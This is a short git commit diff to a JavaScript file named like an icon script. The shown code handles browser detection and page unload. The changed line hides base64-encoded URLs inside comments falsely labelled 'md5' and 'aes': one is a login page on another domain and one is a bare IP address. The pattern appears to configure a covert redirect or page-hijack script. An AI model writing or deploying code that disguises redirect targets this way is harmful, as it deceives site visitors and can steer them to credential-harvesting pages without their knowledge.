1e2b263b762ffbe8df4a9061c2321f85b5607061
caocaodage <caocaodajun@gmail.com>
2021-12-18 22:02:21 +0800

    init

--- js/icon_x4mchj.js
+++ js/icon_x4mchj.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly9tLmJhaWR1LmNvbQ==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cHM6Ly9tcXg2LmNvbS9ob21lL2xvZ2luL2luZGV4Lmh0bWw=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
